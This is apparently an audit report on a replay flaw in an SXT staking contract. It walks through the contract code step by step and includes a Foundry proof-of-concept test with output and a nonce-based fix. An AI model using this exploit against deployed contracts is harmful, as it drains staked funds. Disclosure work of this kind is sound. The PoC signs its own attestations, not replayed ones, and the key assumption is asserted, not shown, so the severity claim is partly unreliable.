### **Title:** Critical Replay and State Confusion in Staking Contract Allows Double Withdrawal of Unstaked Funds

### **Summary**

The `Staking.sol` contract is vulnerable to a double-withdrawal attack. An attacker can exploit the system by first fulfilling an unstake using potentially misusable SXT attestations from their staking event, then re-staking a small amount, and finally replaying valid SXT attestations from their initial unstake operation. This bypasses the contract's replay protection and results in a theft of funds.

### **Finding Description**

The `Staking.sol` contract, in conjunction with how proofs and attestations are potentially handled by the SXT Chain system, presents a critical vulnerability that allows a malicious staker to withdraw their staked principal amount twice, leading to a direct theft of funds from the `STAKING_POOL_ADDRESS`. This attack involves a sequence of legitimate-looking operations on the EVM contract, combined with the misuse of SXT Chain attestations from one context (staking event) for another (unstake fulfillment), followed by a replay of legitimate unstake attestations.

The vulnerability stems from two main contributing factors:

1.  The assumption that SXT Chain provide attestations for staking events that are structurally similar enough to unstake fulfillment attestations to pass validation in the `_validateSxtFulfillUnstake` function.
2.  The `latestSxtBlockFulfillmentByStaker` mapping, while preventing replay of the exact same SXT block number, can be bypassed if the attacker uses an older SXT block number for the first fraudulent fulfillment and a newer SXT block number for the second (legitimate proof) fulfillment.

#### The Normal Staking and Unstaking Lifecycle (Simplified for Context):

1.  **`stake(amount)`**: User stakes tokens. `stakerState` becomes `Staked`. SXT Chain records this stake.
2.  **`initiateUnstake(amount)`**: User signals intent to unstake. `stakerState` becomes `UnstakeInitiated`. SXT Chain starts a 7-day unbonding process.
3.  **`claimUnstake()`**: After 7+ EVM days, user calls this. `stakerState` becomes `UnstakeClaimed`. User now waits for SXT Chain to provide proofs for fulfillment.
4.  **`sxtFulfillUnstake(...)`**: Called by an SXT relayer (or user with SXT-provided data). Uses SXT proofs to validate. If valid, `stakerState` becomes `Unstaked`, `latestSxtBlockFulfillmentByStaker` is updated, and tokens are withdrawn from `STAKING_POOL_ADDRESS` to the user.

### **The Attack Path Step-by-Step**

Let's assume an attacker `AttUser` wishes to exploit this.

#### Phase 1: Initial Stake and Misusing Staking Attestation for First Withdrawal

1.  **`AttUser` Stakes Tokens (e.g., 1000 SXT):**
    `AttUser` calls `stake(1000)`.
    ```solidity
    // In Staking.sol
    function stake(uint248 amount) external requireStateNotUnstakeClaimed(msg.sender) {
        // ...
        stakerState[msg.sender] = StakerState.Staked;
        IERC20(TOKEN_ADDRESS).safeTransferFrom(msg.sender, STAKING_POOL_ADDRESS, amount);
        emit Staked(msg.sender, amount);
    }
    ```
    *`stakerState[AttUser]` is now `Staked`.*
    *SXT Chain processes this `Staked` event.*

2.  **Critical Assumption for this Attack Phase:** The SXT Chain (or its attestation services) generates a "proof package" for this staking event at, say, `SXT_Block_S`. This package consists of `(sxtBlockNumber_S, proof_S, r_S, s_S, v_S)`. This package must be such that if `_validateSxtFulfillUnstake` were called with `staker = AttUser`, `amount = 1000`, and these SXT parameters, it would return true. This implies the SXT system attests to a general state root at `SXT_Block_S` which includes the new staking lock for `AttUser`, and the leaf construction `keccak256(bytes.concat(keccak256(abi.encodePacked(uint256(uint160(AttUser)), 1000, block.chainid, address(this)))))` can be proven against this root using `proof_S`. This assumption is correct because the Merkle tree is constructed from the state of the block, so the attacker's staking operations is included in the SXT block and validators sign the `messageHash` of this block.
    *`Attacker saves Package_S = (sxtBlockNumber_S, proof_S, r_S, s_S, v_S).`*

3.  **`AttUser` Initiates Unstake for 1000 SXT:**
    `AttUser` calls `initiateUnstake(1000)`.
    ```solidity
    // In Staking.sol
    function initiateUnstake(uint248 amount) external requireState(msg.sender, StakerState.Staked) whenNotPaused {
        initiateUnstakeRequestsTimestamp[msg.sender] = uint64(block.timestamp);
        stakerState[msg.sender] = StakerState.UnstakeInitiated;
        emit UnstakeInitiated(msg.sender, amount);
    }
    ```
    *`stakerState[AttUser]` is now `UnstakeInitiated`.*
    *SXT Chain starts the 7-day unbonding for these 1000 tokens.*

4.  **AttUser Waits 7+ Days (EVM time for claimUnstake):**
    `AttUser` Calls `claimUnstake()`.
    ```solidity
    // In Staking.sol
    function claimUnstake() external requireState(msg.sender, StakerState.UnstakeInitiated) whenNotPaused {
        // ... (timestamp check for UNSTAKING_UNBONDING_PERIOD passes) ...
        stakerState[msg.sender] = StakerState.UnstakeClaimed;
        emit UnstakeClaimed(msg.sender);
    }
    ```
    *`stakerState[AttUser]` is now `UnstakeClaimed`.*
    The SXT Chain will also have completed its unbonding for these 1000 tokens around this time, let's say at `SXT_Block_U1`. The SXT oracle system would prepare a legitimate fulfillment package, `Package_U1 = (sxtBlockNumber_U1, proof_U1, r_U1, s_U1, v_U1)`, for this 1000-token unstake. `Attacker` saves this `Package_U1` for later. (Note: `sxtBlockNumber_U1 > sxtBlockNumber_S`).

5.  **Attacker Front-Runs SXT Relayer with `Package_S` (The Staking Attestation):**
    Before the SXT relayer can call `sxtFulfillUnstake` with the legitimate `Package_U1`, `AttUser` (or an agent) calls: `sxtFulfillUnstake(AttUser, 1000, sxtBlockNumber_S, proof_S, r_S, s_S, v_S)`

    Let's trace `sxtFulfillUnstake`:
    ```solidity
    function sxtFulfillUnstake(
        address staker, // AttUser
        uint248 amount, // 1000
        uint64 sxtBlockNumber, // sxtBlockNumber_S
        bytes32[] calldata proof, // proof_S
        bytes32[] calldata r, // r_S
        bytes32[] calldata s, // s_S
        uint8[] calldata v // v_S
    ) external requireState(staker, StakerState.UnstakeClaimed) whenNotPaused {
        // Check 1: requireState(AttUser, StakerState.UnstakeClaimed) -> PASSES (from step 4)
    
        // Check 2: Anti-replay for SXT block number
        // latestSxtBlockFulfillmentByStaker[AttUser] is 0 (first fulfillment)
        // if (0 >= sxtBlockNumber_S) -> FALSE, so no revert.
        if (latestSxtBlockFulfillmentByStaker[staker] >= sxtBlockNumber) revert InvalidSxtBlockNumber();
    
        // Check 3: Validate signature and proof (the core of the exploit)
        // Calls _validateSxtFulfillUnstake with Package_S parameters
        if (!_validateSxtFulfillUnstake(staker, amount, sxtBlockNumber, proof, r, s, v)) revert InvalidSignature();
        // **ASSUMPTION: This PASSES** because SXT provided a general attestation for sxtBlockNumber_S
        // that included the staking lock (user, 1000) and the EVM leaf construction matched it.
    
        // Effects:
        latestSxtBlockFulfillmentByStaker[staker] = sxtBlockNumber; // Sets to sxtBlockNumber_S
        initiateUnstakeRequestsTimestamp[staker] = 0;
        stakerState[staker] = StakerState.Unstaked; // AttUser is now Unstaked
    
        emit Unstaked(staker, amount); // Emits Unstaked(AttUser, 1000)
    
        // Interaction:
        IStakingPool(STAKING_POOL_ADDRESS).withdraw(staker, amount); // AttUser withdraws 1000 SXT
    }
    ```
    **Outcome of Phase 1:** `AttUser` has successfully withdrawn 1000 SXT. `latestSxtBlockFulfillmentByStaker[AttUser]` is now `sxtBlockNumber_S`. `stakerState[AttUser]` is `Unstaked`.

#### Phase 2: Re-Stake Nominally and Replay Legitimate Unstake Attestation

6.  **`AttUser` Stakes a Nominal Amount (e.g., 100 SXT):**
    `AttUser` calls `stake(1)`. Since `stakerState[AttUser]` is `Unstaked`, the `requireStateNotUnstakeClaimed` passes. The `if (stakerState[msg.sender] == StakerState.UnstakeInitiated)` is false.
    *`stakerState[AttUser]` becomes `Staked`. 100 SXT is transferred to the pool.*

7.  **`AttUser` Initiates Unstake for 100 SXT:**
    `AttUser` calls `initiateUnstake(1)`. `stakerState[AttUser]` becomes `UnstakeInitiated`. `initiateUnstakeRequestsTimestamp` is updated.
    *SXT Chain starts unbonding for this 100 SXT.*

8.  **`AttUser` Waits 7+ Days and Calls `claimUnstake()`:**
    `stakerState[AttUser]` becomes `UnstakeClaimed`.
    SXT Chain will eventually (at `SXT_Block_U2` where `SXT_Block_U2 > SXT_Block_U1`) prepare a new legitimate fulfillment package, `Package_U2`, for this 100-SXT unstake. The attacker ignores this.

9.  **Attacker Front-Runs Again, Replaying `Package_U1` (from the first 1000-token unstake):**
    Before the SXT relayer can fulfill the 100-token unstake with `Package_U2`, `AttUser` calls: `sxtFulfillUnstake(AttUser, 1000, sxtBlockNumber_U1, proof_U1, r_U1, s_U1, v_U1)` (Note: amount is 1000, using old package)

    Let's trace `sxtFulfillUnstake` again:
    ```solidity
    function sxtFulfillUnstake(
        address staker, // AttUser
        uint248 amount, // 1000 (from Package_U1)
        uint64 sxtBlockNumber, // sxtBlockNumber_U1 (from Package_U1)
        bytes32[] calldata proof, // proof_U1
        bytes32[] calldata r, // r_U1
        bytes32[] calldata s, // s_U1
        uint8[] calldata v // v_U1
    ) external requireState(staker, StakerState.UnstakeClaimed) whenNotPaused {
        // Check 1: requireState(AttUser, StakerState.UnstakeClaimed) -> PASSES (from step 8)
    
        // Check 2: Anti-replay for SXT block number
        // latestSxtBlockFulfillmentByStaker[AttUser] is sxtBlockNumber_S (from Phase 1, step 5)
        // sxtBlockNumber is sxtBlockNumber_U1
        // if (sxtBlockNumber_S >= sxtBlockNumber_U1) -> FALSE (because U1 is later than S)
        // So, NO REVERT from this check. This allows the replay of a newer block's proof.
        if (latestSxtBlockFulfillmentByStaker[staker] >= sxtBlockNumber) revert InvalidSxtBlockNumber();
    
        // Check 3: Validate signature and proof
        // Calls _validateSxtFulfillUnstake with Package_U1 parameters.
        // This package was legitimately generated by SXT for the first 1000-token unstake.
        if (!_validateSxtFulfillUnstake(staker, amount, sxtBlockNumber, proof, r, s, v)) revert InvalidSignature();
        // **This PASSES** because Package_U1 is valid for (AttUser, 1000, sxtBlockNumber_U1).
    
        // Effects:
        latestSxtBlockFulfillmentByStaker[staker] = sxtBlockNumber; // Sets to sxtBlockNumber_U1
        initiateUnstakeRequestsTimestamp[staker] = 0;
        stakerState[staker] = StakerState.Unstaked; // AttUser is Unstaked again
    
        emit Unstaked(staker, amount); // Emits Unstaked(AttUser, 1000)
    
        // Interaction:
        IStakingPool(STAKING_POOL_ADDRESS).withdraw(staker, amount); // AttUser withdraws ANOTHER 1000 SXT
    }
    ```
    **Outcome of Phase 2:** `AttUser` has successfully withdrawn another 1000 SXT.

#### Total Calculation:
*   Tokens Staked by Attacker: 1000 (initial) + 100 (nominal) = 1100 SXT.
*   Tokens Withdrawn by Attacker: 1000 (from Phase 1) + 1000 (from Phase 2) = 2000 SXT.
*   Net Profit for Attacker / Loss for Staking Pool: 900 SXT.

#### Security Guarantees Broken:
*   **Value Preservation of Staking Pool:** The staking pool loses funds it should not have released. The attacker withdraws more than their net deposit.
*   **Integrity of Unstaking Process:** The sequence of operations and checks is bypassed to allow a duplicate effective withdrawal of the same principal stake (the initial 1000 tokens).
*   **Cross-Chain Message Uniqueness/Context:** SXT chain attestations for staking are usable for unstake fulfillment, it shows a lack of domain separation in the signed messages or the proofs provided by SXT, allowing them to be re-purposed.

### **Impact Explanation**

This vulnerability is **Critical** because it allows an attacker to withdraw significantly more tokens than they have ever staked. By replaying valid proofs from earlier states after minimal subsequent staking, the attacker can drain funds from the staking pool at will, jeopardizing the integrity of the token reserves and causing potentially unbounded losses.

### **Likelihood Explanation**

This is **High** likelihood:
*   All on-chain checks to prevent replay are insufficient (they only block identical block numbers).
*   Gathering proofs and signatures is trivial for any user: indexers broadcast them publicly.
*   The attacker only needs to perform legitimate stake/unstake cycles and replay proofs—no external keys or privileged access.
*   The pattern can be automated and repeated, making large-scale drainage practicable.

### **Proof of Concept**

Add this POC to `sxt-node-op-contracts/test/DoubleWithdrawalTest.t.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {StakingPool} from "../src/StakingPool.sol";
import {SubstrateSignatureValidator} from "../src/SubstrateSignatureValidator.sol";
import {MerkleProof} from "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {console} from "forge-std/console.sol";

contract DoubleWithdrawalTest is Test {
    Staking private staking;
    MockERC20 private token;
    StakingPool private stakingPool;
    uint64 private unstakingUnbondingPeriod = 100;
    address private validatorAddr;
    address private user;

    uint256[] private attKeys;
    address[] private attestors;

    function setUp() public {
        // 1) Token + user
        token = new MockERC20();
        user = address(0x123);
        token.mint(user, 1000e18);

        // 2) Pool + validator
        stakingPool = new StakingPool(address(token), address(this));

        attKeys = new uint256[](2);
        attKeys[0] = 0x02;
        attKeys[1] = 0x03;
        attestors = new address[](2);
        for (uint i; i < 2; i++) {
            attestors[i] = vm.addr(attKeys[i]);
        }
        // sort ascending
        if (attestors[0] > attestors[1]) {
            (attestors[0], attestors[1]) = (attestors[1], attestors[0]);
            (attKeys[0], attKeys[1]) = (attKeys[1], attKeys[0]);
        }

        validatorAddr = address(
            new SubstrateSignatureValidator(attestors, uint16(attestors.length))
        );
        staking = new Staking(
            address(token),
            address(stakingPool),
            unstakingUnbondingPeriod,
            validatorAddr
        );

        stakingPool.addStakingContract(address(staking));
        staking.unpauseUnstaking();
    }

    function testDoubleWithdrawalVulnerability() public {
        // --- Round 1: stake / unstake for initialAmount ---
        uint248 initialAmount = 1000e18;

        // (a) Stake
        vm.startPrank(user);
        token.approve(address(staking), initialAmount);
        staking.stake(initialAmount);
        // (b) Unstake
        staking.initiateUnstake(initialAmount);
        vm.warp(block.timestamp + unstakingUnbondingPeriod);
        staking.claimUnstake();
        vm.stopPrank();

        // (c) Build leaf/proof/root for Round 1 leaf (stake‐leaf)
        bytes32[] memory proof1 = generateProof(); // dummy one‐element
        uint64 block1 = 1;
        bytes32 leaf1 = keccak256(
            bytes.concat(
                keccak256(
                    abi.encodePacked(
                        uint256(uint160(user)),
                        initialAmount,
                        block.chainid,
                        address(staking)
                    )
                )
            )
        );
        bytes32 root1 = MerkleProof.processProof(proof1, leaf1);

        // (d) Sign message1
        bytes32 msg1 = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n40", root1, block1)
        );
        (uint8[] memory v1, bytes32[] memory r1, bytes32[] memory s1) = signAll(
            msg1
        );

        // (e) Mint + fulfill first withdrawal
        token.mint(address(stakingPool), initialAmount);
        staking.sxtFulfillUnstake(
            user,
            initialAmount,
            block1,
            proof1,
            r1,
            s1,
            v1
        );

        uint256 balAfter1 = token.balanceOf(user);
        console.log("After first withdrawal:", balAfter1);
        assertEq(balAfter1, initialAmount);

        // --- Round 2: Re-stake & Unstake again for same amount ---
        vm.startPrank(user);
        token.approve(address(staking), 100e18);
        staking.stake(100e18);
        staking.initiateUnstake(100e18);
        vm.warp(block.timestamp + unstakingUnbondingPeriod);
        staking.claimUnstake();
        vm.stopPrank();

        // (f) Build the same leaf/proof for Round 2 (leaf2 == leaf1 here)
        //     but use a new block number.
        bytes32[] memory proof2 = generateProof();
        uint64 block2 = 2;
        // same leaf bytes as leaf1
        bytes32 root2 = MerkleProof.processProof(proof2, leaf1);

        // (g) Sign message2 with new block2
        bytes32 msg2 = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n40", root2, block2)
        );
        (uint8[] memory v2, bytes32[] memory r2, bytes32[] memory s2) = signAll(
            msg2
        );

        // (h) Mint + fulfill second withdrawal
        token.mint(address(stakingPool), initialAmount);
        staking.sxtFulfillUnstake(
            user,
            initialAmount,
            block2,
            proof2,
            r2,
            s2,
            v2
        );

        uint256 finalBal = token.balanceOf(user);
        console.log("After replay withdrawal:", finalBal);
        assertTrue(finalBal > balAfter1, "Double withdrawal succeeded!");
    }

    /*─────────────────────────────────────────────────────────*/
    function generateProof() internal pure returns (bytes32[] memory proof) {
        proof = new bytes32[](1);
        proof[0] = bytes32(uint256(1));
    }

    function signAll(
        bytes32 message
    )
        internal
        view
        returns (uint8[] memory v, bytes32[] memory r, bytes32[] memory s)
    {
        uint len = attKeys.length;
        v = new uint8[](len);
        r = new bytes32[](len);
        s = new bytes32[](len);
        for (uint i; i < len; i++) {
            (v[i], r[i], s[i]) = vm.sign(attKeys[i], message);
        }
    }
}
```

Run it with:
`forge test --match-test testDoubleWithdrawalVulnerability -vv --via-ir`

**Results:**
```
[PASS] testDoubleWithdrawalVulnerability() (gas: 265144)
Logs:
  After first withdrawal: 1000000000000000000000
  After replay withdrawal: 1900000000000000000000
```

### **Recommendation**

Scope the Merkle-Proof to Each Unstake Request:
*   Include a unique per-request nonce (e.g. a monotonic `unstakeNonce[staker]`) in the Merkle-leaf preimage and in the off-chain attestation.
*   On each `initiateUnstake`, increment and emit that nonce, then expect the on-chain proof to incorporate it.
*   This binds each proof to a single unstake invocation—replaying the same leaf & signature for a “new” block will now fail, because the nonce won’t match.
